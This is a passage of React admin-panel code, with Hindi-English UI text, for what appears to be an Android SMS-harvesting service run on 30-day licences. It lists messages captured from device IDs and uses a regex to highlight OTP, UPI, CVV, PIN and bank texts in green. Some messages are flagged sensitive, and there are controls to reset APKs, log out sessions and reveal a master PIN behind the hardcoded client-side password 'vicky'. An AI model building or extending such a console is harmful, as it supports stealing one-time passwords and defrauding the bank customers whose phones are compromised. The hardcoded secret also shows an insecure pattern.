function ChangePinModal({ masterPin, onClose, onChanged }: { masterPin: string; onClose: () => void; onChanged: (p: string) => void }) {
  const [newPin, setNewPin] = useState(""); const [newPin2, setNewPin2] = useState("");
  const [err, setErr] = useState(""); const [loading, setLoading] = useState(false);
  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (newPin.length < 4) { setErr("New PIN must be at least 4 characters"); return; }
    if (newPin !== newPin2) { setErr("PINs do not match"); return; }
    setErr(""); setLoading(true);
    try {
      const r = await apiFetch("/api/admin/master-pin", { method: "PATCH", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ currentPin: masterPin, newPin }) });
      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Failed"); return; }
      onChanged(newPin);
    } catch { setErr("Network error"); } finally { setLoading(false); }
  }
  return (
    <Modal onClose={onClose} maxWidth={380}>
      <ModalHeader title="Change Master PIN" icon={<Ic.Key />} onClose={onClose} />
      <form onSubmit={handleSubmit}>
        {[{ label: "New PIN", val: newPin, set: setNewPin }, { label: "Confirm New PIN", val: newPin2, set: setNewPin2 }].map(({ label, val, set }) => (
          <div key={label} style={{ marginBottom: 12 }}><FieldLabel>{label}</FieldLabel><input type="password" value={val} onChange={e => set(e.target.value)} style={inpBase} /></div>
        ))}
        {err && <ErrBanner msg={err} />}
        <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
          <button type="button" onClick={onClose} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: T.border, border: `1px solid ${T.borderLight}`, color: T.text, fontWeight: 700, cursor: "pointer", fontSize: 13 }}>Cancel</button>
          <button type="submit" disabled={loading} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 700, cursor: loading ? "default" : "pointer", fontSize: 13 }}>{loading ? "Saving…" : "Change PIN"}</button>
        </div>
      </form>
    </Modal>
  );
}

/* ── View Master PIN Modal ── */
function ViewPinModal({ masterPin, onClose }: { masterPin: string; onClose: () => void }) {
  const [pass, setPass] = useState(""); const [revealed, setRevealed] = useState(false);
  const [err, setErr] = useState(""); const [showRevealed, setShowRevealed] = useState(false);
  const HARDCODED = "vicky";
  function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (pass === HARDCODED) { setRevealed(true); setErr(""); }
    else { setErr("Galat password. Dobara try karo."); setPass(""); }
  }
  return (
    <Modal onClose={onClose} maxWidth={360}>
      <ModalHeader title="View Master PIN" icon={<Ic.Eye />} onClose={onClose} />
      {!revealed ? (
        <form onSubmit={handleSubmit}>
          <p style={{ fontSize: 13, color: T.muted, marginBottom: 16 }}>Master PIN dekhne ke liye password enter karo.</p>
          <FieldLabel>Password</FieldLabel>
          <input type="password" value={pass} onChange={e => setPass(e.target.value)} placeholder="Password enter karo" autoFocus style={inpBase} />
          {err && <ErrBanner msg={err} />}
          <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
            <button type="button" onClick={onClose} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: T.border, border: `1px solid ${T.borderLight}`, color: T.text, fontWeight: 700, cursor: "pointer", fontSize: 13 }}>Cancel</button>
            <button type="submit" disabled={!pass} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: pass ? "linear-gradient(135deg,#5254d4,#7c3aed)" : T.borderLight, border: "none", color: pass ? "#fff" : T.muted, fontWeight: 700, cursor: pass ? "pointer" : "default", fontSize: 13 }}>Dekho</button>
          </div>
        </form>
      ) : (
        <div>
          <p style={{ fontSize: 13, color: T.muted, marginBottom: 16 }}>Yeh hai aapka current Master PIN:</p>
          <div style={{ background: T.bg, border: `1px solid ${T.borderLight}`, borderRadius: 10, padding: "14px 16px", display: "flex", alignItems: "center", justifyContent: "space-between", gap: 10 }}>
            <span style={{ fontFamily: "monospace", fontSize: 22, fontWeight: 800, color: T.accentLight, letterSpacing: 4 }}>
              {showRevealed ? masterPin : "•".repeat(masterPin.length)}
            </span>
            <button type="button" onClick={() => setShowRevealed(v => !v)} style={{ background: "none", border: "none", color: showRevealed ? T.accentLight : T.muted, cursor: "pointer", display: "flex", alignItems: "center", padding: 4 }}>
              {showRevealed ? <Ic.EyeOff /> : <Ic.Eye />}
            </button>
          </div>
          <button onClick={onClose} style={{ width: "100%", marginTop: 18, padding: "12px 0", borderRadius: 10, background: T.border, border: `1px solid ${T.borderLight}`, color: T.text, fontWeight: 700, cursor: "pointer", fontSize: 13 }}>Close</button>
        </div>
      )}
    </Modal>
  );
}

/* ── Edit App Modal ── */
function EditAppModal({ app, masterPin, onClose, onUpdated }: { app: App; masterPin: string; onClose: () => void; onUpdated: (a: App) => void }) {
  const [name, setName] = useState(app.name);
  const [err, setErr] = useState(""); const [loading, setLoading] = useState(false);
  const [resetDone, setResetDone] = useState(false);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!name.trim()) { setErr("Name required"); return; }
    setErr(""); setLoading(true);
    try {
      const r = await apiFetch(`/api/master/apps/${encodeURIComponent(app.appId)}`, { method: "PATCH", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ name: name.trim(), pin: app.pin }) });
      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Failed"); return; }
      onUpdated(await r.json() as App);
    } catch { setErr("Network error"); } finally { setLoading(false); }
  }

  async function handleResetPin() {
    if (!confirm("Sub-admin ka PIN 1234 pe reset karein?")) return;
    setErr(""); setLoading(true);
    try {
      const r = await apiFetch(`/api/master/apps/${encodeURIComponent(app.appId)}`, { method: "PATCH", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ name: name.trim() || app.name, pin: "1234" }) });
      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Failed"); return; }
      onUpdated(await r.json() as App);
      setResetDone(true);
    } catch { setErr("Network error"); } finally { setLoading(false); }
  }

  return (
    <Modal onClose={onClose}>
      <ModalHeader title="Edit App" icon={<Ic.Pencil />} onClose={onClose} />
      <div style={{ fontSize: 11, color: T.muted, marginBottom: 18, fontFamily: "monospace", background: T.inputBg, padding: "6px 12px", borderRadius: 8, display: "inline-block", border: `1px solid ${T.borderLight}` }}>{app.appId}</div>
      <form onSubmit={handleSubmit}>
        <div style={{ marginBottom: 14 }}><FieldLabel>App Name</FieldLabel><input type="text" value={name} onChange={e => setName(e.target.value)} style={inpBase} /></div>
        {/* PIN reset only — master cannot set custom PIN */}
        <div style={{ marginBottom: 14 }}>
          <FieldLabel>Login PIN</FieldLabel>
          <div style={{ display: "flex", alignItems: "center", gap: 10, background: T.inputBg, border: `1px solid ${T.borderLight}`, borderRadius: 10, padding: "10px 14px" }}>
            <span style={{ flex: 1, fontFamily: "monospace", fontSize: 15, letterSpacing: 4, color: T.muted }}>{"•".repeat(app.pin?.length ?? 4)}</span>
            <button type="button" onClick={handleResetPin} disabled={loading || resetDone} style={{ padding: "5px 12px", borderRadius: 8, background: resetDone ? T.green + "22" : "rgba(239,68,68,0.15)", border: `1px solid ${resetDone ? T.green + "50" : "rgba(239,68,68,0.35)"}`, color: resetDone ? T.green : "#f87171", fontWeight: 700, fontSize: 12, cursor: loading || resetDone ? "default" : "pointer", whiteSpace: "nowrap" }}>
              {resetDone ? "✓ Reset ho gaya" : loading ? "…" : "Reset → 1234"}
            </button>
          </div>
          <div style={{ fontSize: 11, color: T.muted, marginTop: 5 }}>Master sirf 1234 pe reset kar sakta hai. Custom PIN sub-admin set karta hai.</div>
        </div>
        {err && <ErrBanner msg={err} />}
        <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
          <button type="button" onClick={onClose} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: T.border, border: `1px solid ${T.borderLight}`, color: T.text, fontWeight: 700, cursor: "pointer", fontSize: 13 }}>Cancel</button>
          <button type="submit" disabled={loading} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 700, cursor: loading ? "default" : "pointer", fontSize: 13 }}>{loading ? "Saving…" : "Save Name"}</button>
        </div>
      </form>
    </Modal>
  );
}

/* ── Renew Modal ── */
function RenewModal({ app, masterPin, onClose, onRenewed }: { app: App; masterPin: string; onClose: () => void; onRenewed: (a: App) => void }) {
  const [loading, setLoading] = useState(false); const [err, setErr] = useState("");
  const THIRTY_MS = 30 * 24 * 60 * 60 * 1000;
  const oldExpiry = new Date(app.createdAt).getTime() + THIRTY_MS;
  const isExpired = oldExpiry < Date.now();
  const newExpiry = new Date(isExpired ? Date.now() + THIRTY_MS : oldExpiry + THIRTY_MS);
  const newExpiryStr = newExpiry.toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" });
  async function handleRenew() {
    setLoading(true); setErr("");
    try {
      const r = await apiFetch(`/api/master/apps/${encodeURIComponent(app.appId)}/renew`, { method: "POST", headers: { "x-master-pin": masterPin } });
      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Failed"); return; }
      onRenewed(await r.json() as App);
    } catch { setErr("Network error"); } finally { setLoading(false); }
  }
  return (
    <Modal onClose={onClose} maxWidth={380}>
      <ModalHeader title="Renew Licence +30 Days" icon={<Ic.CalendarPlus />} onClose={onClose} />
      <div style={{ background: T.inputBg, borderRadius: 10, padding: "12px 14px", border: `1px solid ${T.green}30`, marginBottom: 14 }}>
        <div style={{ fontSize: 11, color: T.muted, marginBottom: 2 }}>App</div>
        <div style={{ fontWeight: 800, fontSize: 14, color: T.text, marginBottom: 6 }}>{app.name}</div>
        <div style={{ fontFamily: "monospace", fontSize: 11, color: T.accentLight }}>{app.appId}</div>
      </div>
      <div style={{ fontSize: 13, color: T.muted, marginBottom: 14, lineHeight: 1.7 }}>
        {isExpired ? <><span style={{ color: T.red, fontWeight: 700 }}>Licence expired.</span> Fresh <b style={{ color: T.green }}>30-day</b> from today.</> : <>Extended by <b style={{ color: T.green }}>+30 days</b>.</>}<br />
        New expiry: <b style={{ color: T.text }}>{newExpiryStr}</b>
      </div>
      {err && <ErrBanner msg={err} />}
      <div style={{ display: "flex", gap: 10 }}>
        <button onClick={onClose} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: T.border, border: `1px solid ${T.borderLight}`, color: T.text, fontWeight: 700, cursor: "pointer", fontSize: 13 }}>Cancel</button>
        <button onClick={handleRenew} disabled={loading} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: "linear-gradient(135deg,#16a34a,#22c55e)", border: "none", color: "#fff", fontWeight: 800, cursor: loading ? "default" : "pointer", fontSize: 13 }}>{loading ? "Renewing…" : "Confirm +30 Days"}</button>
      </div>
    </Modal>
  );
}

/* ── App Card ── */
function AppCard({ app, onEdit, onDelete, onToggle, onLogoutAll, onCopyUrl, onResetApk, onRenew, copyMsg, deletingId, togglingId, logoutAllId, resetApkId, renewId }: {
  app: App; onEdit: (a: App) => void; onDelete: (a: App) => void;
  onToggle: (a: App) => void; onLogoutAll: (a: App) => void; onCopyUrl: (a: App) => void;
  onResetApk: (a: App) => void; onRenew: (a: App) => void;
  copyMsg: Record<string, string>; deletingId: string | null; togglingId: string | null;
  logoutAllId: string | null; resetApkId: string | null; renewId: string | null;
}) {
  const isActive = app.status === "active";
  const dt = new Date(app.createdAt);
  const dateStr = dt.toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" }) + " · " + dt.toLocaleTimeString("en-IN", { hour: "2-digit", minute: "2-digit", hour12: true });
  return (
    <div style={{ background: T.card, borderRadius: 16, border: `1px solid ${T.borderLight}`, overflow: "hidden", position: "relative", boxShadow: "0 2px 12px rgba(0,0,0,0.18)" }}>
      <div style={{ position: "absolute", left: 0, top: 0, bottom: 0, width: 3, background: isActive ? `linear-gradient(180deg,${T.green},#4ade80)` : `linear-gradient(180deg,${T.red},#f87171)` }} />
      <div style={{ padding: "13px 14px 13px 18px" }}>
        <div style={{ display: "flex", alignItems: "flex-start", gap: 10, marginBottom: 10 }}>
          <div style={{ flex: 1, minWidth: 0 }}>
            <div style={{ fontSize: 15, fontWeight: 800, color: T.text, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{app.name}</div>
            <div style={{ fontSize: 10, color: T.muted, marginTop: 2 }}>{dateStr}</div>
          </div>
          <span style={{ display: "inline-flex", alignItems: "center", gap: 4, fontSize: 10, fontWeight: 700, padding: "3px 9px", borderRadius: 99, color: isActive ? T.green : T.red, background: (isActive ? T.green : T.red) + "18", border: `1px solid ${(isActive ? T.green : T.red)}30` }}>
            <span style={{ width: 5, height: 5, borderRadius: "50%", background: isActive ? T.green : T.red, display: "inline-block" }} />{isActive ? "Active" : "Off"}
          </span>
        </div>
        <div style={{ display: "flex", gap: 8, marginBottom: 11 }}>
          <div style={{ flex: 1, background: T.inputBg, borderRadius: 9, padding: "7px 10px", border: `1px solid ${T.border}`, minWidth: 0 }}>
            <div style={{ fontSize: 9, color: T.muted, fontWeight: 700, letterSpacing: 1, textTransform: "uppercase", marginBottom: 4 }}>App ID</div>
            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
              <span style={{ fontSize: 10, color: T.accentLight, fontFamily: "monospace", fontWeight: 600, flex: 1, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{app.appId}</span>
              <CopyBtn value={app.appId} label="ID" />
            </div>
          </div>
          <div style={{ background: T.inputBg, borderRadius: 9, padding: "7px 10px", border: `1px solid ${T.border}`, flexShrink: 0 }}>
            <div style={{ fontSize: 9, color: T.muted, fontWeight: 700, letterSpacing: 1, textTransform: "uppercase", marginBottom: 4 }}>PIN</div>
            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
              <span style={{ fontSize: 14, color: T.text, fontFamily: "monospace", letterSpacing: 4, fontWeight: 700 }}>{"•".repeat(app.pin?.length ?? 4)}</span>
              <PinCopyBtn value={app.pin} />
            </div>
          </div>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "7px 10px", borderRadius: 9, background: app.deleteProtectionPin ? (app.deleteProtectionEnabled ? "#16a34a18" : "#1a274080") : "#1a274050", border: `1px solid ${app.deleteProtectionPin ? (app.deleteProtectionEnabled ? "#16a34a40" : T.borderLight) : T.border}`, marginBottom: 7 }}>
          <span style={{ fontSize: 10, color: T.muted, fontWeight: 700, letterSpacing: 0.8, textTransform: "uppercase", flexShrink: 0 }}>Del Password</span>
          <span style={{ flex: 1 }} />
          {app.deleteProtectionPin ? (
            <>
              <span style={{ fontFamily: "monospace", fontSize: 13, fontWeight: 700, color: app.deleteProtectionEnabled ? "#4ade80" : T.mutedLight, letterSpacing: 1 }}>{app.deleteProtectionPin}</span>
              <span style={{ fontSize: 10, fontWeight: 700, padding: "2px 7px", borderRadius: 99, background: app.deleteProtectionEnabled ? "#16a34a22" : T.border, color: app.deleteProtectionEnabled ? "#4ade80" : T.muted, border: `1px solid ${app.deleteProtectionEnabled ? "#16a34a44" : "transparent"}` }}>{app.deleteProtectionEnabled ? "ON" : "OFF"}</span>
            </>
          ) : <span style={{ fontSize: 11, color: T.muted, fontStyle: "italic" }}>Not set</span>}
        </div>
        <div style={{ display: "flex", gap: 5, alignItems: "center" }}>
          <button onClick={() => onCopyUrl(app)} title={copyMsg[app.appId] || "Copy URL"} style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", transition: "all 0.15s", outline: "none", border: "1px solid", background: copyMsg[app.appId] ? T.green + "1a" : T.border + "60", borderColor: copyMsg[app.appId] ? T.green + "55" : T.borderLight, color: copyMsg[app.appId] ? T.green : T.mutedLight }}>
            {copyMsg[app.appId] ? <Ic.Check /> : <Ic.Link />}
          </button>
          <button onClick={() => onEdit(app)} title="Edit" style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", transition: "all 0.15s", outline: "none", background: T.border + "60", border: `1px solid ${T.borderLight}`, color: T.mutedLight }}>
            <Ic.Pencil />
          </button>
          <button onClick={() => onLogoutAll(app)} disabled={logoutAllId === app.appId} title="Logout All Sessions" style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", transition: "all 0.15s", outline: "none", background: "#7c3aed14", border: "1px solid #7c3aed40", color: "#a78bfa", opacity: logoutAllId === app.appId ? 0.45 : 1 }}>
            {logoutAllId === app.appId ? <Spinner /> : <Ic.LogOut2 />}
          </button>
          <button onClick={() => onResetApk(app)} disabled={resetApkId === app.appId} title="Reset APK" style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", transition: "all 0.15s", outline: "none", background: "#0369a114", border: "1px solid #0369a140", color: "#38bdf8", opacity: resetApkId === app.appId ? 0.45 : 1, cursor: resetApkId === app.appId ? "wait" : "pointer" }}>
            {resetApkId === app.appId ? <Spinner /> : <Ic.Refresh />}
          </button>
          <button onClick={() => onRenew(app)} disabled={renewId === app.appId} title="Renew Licence +30 Days" style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", transition: "all 0.15s", outline: "none", background: "#16a34a14", border: "1px solid #16a34a40", color: "#4ade80", opacity: renewId === app.appId ? 0.45 : 1, cursor: renewId === app.appId ? "wait" : "pointer" }}>
            <Ic.CalendarPlus />
          </button>
          <div style={{ width: 1, height: 22, background: T.border, flexShrink: 0 }} />
          <button onClick={() => onToggle(app)} disabled={togglingId === app.appId} title={isActive ? "Disable" : "Enable"} style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", transition: "all 0.15s", outline: "none", background: isActive ? T.yellow + "14" : T.green + "14", border: `1.5px solid ${isActive ? T.yellow + "55" : T.green + "55"}`, color: isActive ? T.yellow : T.green, opacity: togglingId === app.appId ? 0.45 : 1, cursor: togglingId === app.appId ? "wait" : "pointer" }}>
            <Ic.Power />
          </button>
        </div>
      </div>
    </div>
  );
}

/* ── App Selector ── */
function AppSelector({ apps, value, onChange, allLabel = "All Apps" }: { apps: App[]; value: string; onChange: (v: string) => void; allLabel?: string }) {
  return (
    <div style={{ position: "relative", display: "inline-block" }}>
      <select value={value} onChange={e => onChange(e.target.value)} style={{ appearance: "none", WebkitAppearance: "none", background: T.card, border: `1px solid ${T.borderLight}`, color: T.text, borderRadius: 9, padding: "8px 36px 8px 12px", fontSize: 13, fontWeight: 600, outline: "none", cursor: "pointer", fontFamily: "inherit" }}>
        <option value="">{allLabel}</option>
        {apps.map(a => <option key={a.appId} value={a.appId}>{a.name} · {a.appId}</option>)}
      </select>
      <div style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", pointerEvents: "none", color: T.muted }}><Ic.ChevronDown /></div>
    </div>
  );
}

/* ── Message helpers (same logic as sub admin) ── */
function isBankingMsg(body: string, sender: string): boolean {
  const text = (body + " " + sender).toLowerCase();
  return /\b(otp|upi|neft|rtgs|imps|bank|credit|debit|account|balance|transaction|txn|payment|transfer|rupee|inr|atm|cvv|pin|emi|loan|insurance|fraud|wallet|paytm|gpay|phonepe|bhim|recharge|cashback|refund|invoice|bill|due|mandate|auto.?pay|salary|withdraw|deposit)\b|₹/.test(text);
}
function isJunkSender(sender: string | null | undefined): boolean {
  if (!sender) return true;
  const s = sender.trim().toLowerCase();
  return !s || s === "new sms" || s === "unknown" || s === "sms" || s.startsWith("sms from ");
}
function fmtShort(iso: string): string {
  return new Date(iso).toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: false });
}

/* ── MsgCard — identical to sub admin's MsgCard design ── */
function MsgCard({ msg, appColor, onOpenDevice }: { msg: MsgRow; appColor: string; onOpenDevice?: (deviceId: string) => void }) {
  const displaySender = isJunkSender(msg.fromSender) ? msg.fromNumber : msg.fromSender;
  const isBank = isBankingMsg(msg.body, msg.fromSender);
  const [copiedBody, setCopiedBody] = useState(false);
  const [copiedSender, setCopiedSender] = useState(false);
  const [copiedAppId, setCopiedAppId] = useState(false);
  const [copiedDevId, setCopiedDevId] = useState(false);

  function copyVal(val: string, setCopied: (b: boolean) => void) {
    copyToClipboard(val).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000); });
  }

  return (
    <div style={{
      position: "relative", borderRadius: 8, overflow: "hidden",
      border: `1px solid ${T.borderLight}`,
      contentVisibility: "auto", containIntrinsicSize: "auto 140px",
      cursor: onOpenDevice ? "pointer" : "default",
    } as React.CSSProperties}
      onClick={() => onOpenDevice?.(msg.deviceId)}
    >
      <div style={{ background: T.card, padding: "10px 14px", transition: "box-shadow 0.15s" }}
        onMouseEnter={e => (e.currentTarget as HTMLDivElement).style.boxShadow = "0 2px 8px rgba(99,102,241,0.13)"}
        onMouseLeave={e => (e.currentTarget as HTMLDivElement).style.boxShadow = "none"}
      >
        {/* Header: time on left | device + appId on right */}
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6, gap: 8 }}>
          <span style={{ fontSize: 10, color: "#94a3b8" }}>{fmtShort(msg.receivedAt)}</span>
          <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
            <span style={{ fontSize: 9, background: appColor + "22", color: appColor, border: `1px solid ${appColor}55`, borderRadius: 4, padding: "1px 6px", fontWeight: 800 }}>{msg.appId}</span>
            <button onClick={e => { e.stopPropagation(); copyVal(msg.appId, setCopiedAppId); }} title="Copy App ID"
              style={{ background: "none", border: "none", cursor: "pointer", color: copiedAppId ? T.green : "#64748b", padding: 1, display: "flex", flexShrink: 0 }}>
              {copiedAppId
                ? <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                : <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>}
            </button>
            <span style={{ fontSize: 10, background: T.headerBg, color: "#64748b", padding: "1px 7px", borderRadius: 4, fontFamily: "monospace" }}>{msg.deviceId.slice(0, 14)}</span>
            <button onClick={e => { e.stopPropagation(); copyVal(msg.deviceId, setCopiedDevId); }} title="Copy Device ID"
              style={{ background: "none", border: "none", cursor: "pointer", color: copiedDevId ? T.green : "#64748b", padding: 1, display: "flex", flexShrink: 0 }}>
              {copiedDevId
                ? <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                : <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>}
            </button>
          </div>
        </div>

        {/* Body */}
        <div style={{ display: "flex", alignItems: "flex-start", gap: 6, marginBottom: 6 }}>
          <div style={{ flex: 1, fontSize: 13, color: isBank ? "#16a34a" : T.text, lineHeight: 1.55, wordBreak: "break-word" }}>{msg.body}</div>
          <button onClick={e => { e.stopPropagation(); copyVal(msg.body, setCopiedBody); }} title="Copy message"
            style={{ flexShrink: 0, background: "none", border: "none", cursor: "pointer", color: copiedBody ? T.green : T.accentLight, padding: 2, marginTop: 1, display: "flex" }}>
            {copiedBody
              ? <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
              : <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
            }
          </button>
        </div>

        {/* From / To row */}
        <div style={{ display: "flex", gap: 12, fontSize: 11, flexWrap: "wrap", alignItems: "center" }}>
          <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
            <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>FROM</span>
            {displaySender}
            <button onClick={e => { e.stopPropagation(); copyVal(displaySender ?? "", setCopiedSender); }} title="Copy sender"
              style={{ background: "none", border: "none", cursor: "pointer", color: copiedSender ? T.green : T.accentLight, padding: 1, display: "flex" }}>
              {copiedSender
                ? <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                : <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
              }
            </button>
          </span>
          {msg.fromSender && !isJunkSender(msg.fromSender) && msg.fromNumber !== msg.fromSender && (
            <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
              <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>NUM</span>
              {msg.fromNumber}
            </span>
          )}
          {msg.toNumber && (
            <span style={{ color: "#64748b", display: "inline-flex", alignItems: "center", gap: 4 }}>
              <span style={{ color: "#94a3b8", marginRight: 3, fontWeight: 600, fontSize: 10 }}>TO</span>
              {msg.toNumber}
              <button onClick={e => { e.stopPropagation(); copyVal(msg.toNumber!, setCopiedSender); }} title="Copy receiver"
                style={{ background: "none", border: "none", cursor: "pointer", color: copiedSender ? T.green : T.accentLight, padding: 1, display: "flex" }}>
                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
              </button>
            </span>
          )}
          {msg.isSensitive && <span style={{ fontSize: 9, fontWeight: 800, color: T.red, background: T.red + "18", borderRadius: 4, padding: "1px 5px" }}>SENSITIVE</span>}
        </div>
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════
   MESSAGES TAB
══════════════════════════════════════════ */
function MessagesTab({ apps, masterPin, syncTick: _syncTick, onOpenDevice }: { apps: App[]; masterPin: string; syncTick?: number; onOpenDevice?: (deviceId: string) => void }) {
  /* ── State ── */
  const [msgs, setMsgs] = useState<MsgRow[]>([]);
  const [appFilter, setAppFilter] = useState("");
  const [search, setSearch] = useState("");
  const [sensitiveOnly, setSensitiveOnly] = useState(false);

  /* Browse mode state */
  const [loading, setLoading] = useState(false);
  const [loadingMore, setLoadingMore] = useState(false);
  const [hasMore, setHasMore] = useState(true);
  const cursorRef = useRef<number | null>(null);

  /* Search mode state */
  const [searching, setSearching] = useState(false);
  const [searchDone, setSearchDone] = useState(false);
  const [searchHasMore, setSearchHasMore] = useState(false);
  const [searchLoadedCount, setSearchLoadedCount] = useState(0);
  const [loadingMoreSearch, setLoadingMoreSearch] = useState(false);
  const searchCursorRef = useRef<number | null>(null); // last id seen, for next search page
  const SEARCH_PAGE = 100;

  const sentinelRef = useRef<HTMLDivElement>(null);

  /* DB total count */
  const [totalDbCount, setTotalDbCount] = useState<number | null>(null);
  useEffect(() => {
    setTotalDbCount(null);
    const qs = appFilter ? `?appId=${encodeURIComponent(appFilter)}` : "";
    apiFetch(`/api/messages/count${qs}`, { headers: { "x-master-pin": masterPin } })
      .then(r => r.ok ? r.json() as Promise<{ count: number }> : null)
      .then(d => d && setTotalDbCount(d.count))
      .catch(() => {});
  }, [appFilter, masterPin]);

  /* Debounce — 500ms */
  const [debouncedSearch, setDebouncedSearch] = useState("");
  useEffect(() => {
    const t = setTimeout(() => setDebouncedSearch(search.trim()), 500);
    return () => clearTimeout(t);
  }, [search]);

  // Live: WebSocket fires mrrobot:message_added → prepend new message (browse mode only)
  useEffect(() => {
    function onAdded(e: Event) {
      const payload = (e as CustomEvent<{ appId: string; message: MsgRow }>).detail;
      if (appFilter && payload.appId !== appFilter) return;
      if (debouncedSearch) return; // don't mess with search results
      setMsgs(prev => {
        if (prev.some(m => m.id === payload.message.id)) return prev;
        return [payload.message, ...prev];
      });
      setTotalDbCount(c => c !== null ? c + 1 : c);
    }
    window.addEventListener("mrrobot:message_added", onAdded);
    return () => window.removeEventListener("mrrobot:message_added", onAdded);
  }, [appFilter, debouncedSearch]);

  /* ── BROWSE: load first page ── */
  const loadFirst = useCallback(async () => {
    setLoading(true);
    setMsgs([]); cursorRef.current = null; setHasMore(true);
    setSearchDone(false); setSearchHasMore(false); setSearchLoadedCount(0);
    try {
      const qs = new URLSearchParams({ limit: "30" });
      if (appFilter) qs.set("appId", appFilter);
      const r = await apiFetch(`/api/messages?${qs}`, { headers: { "x-master-pin": masterPin } });
      if (r.ok) {
        const data = await r.json() as MsgRow[];
        setMsgs(data);
        setHasMore(data.length === 30);
        cursorRef.current = data.length > 0 ? data[data.length - 1].id : null;
      }
    } catch { } finally { setLoading(false); }
  }, [appFilter, masterPin]);

  /* ── BROWSE: load next page (append) ── */
  const loadMore = useCallback(async () => {
    if (loadingMore || !hasMore || cursorRef.current === null) return;
    setLoadingMore(true);
    try {
      const qs = new URLSearchParams({ limit: "30", cursor: String(cursorRef.current) });
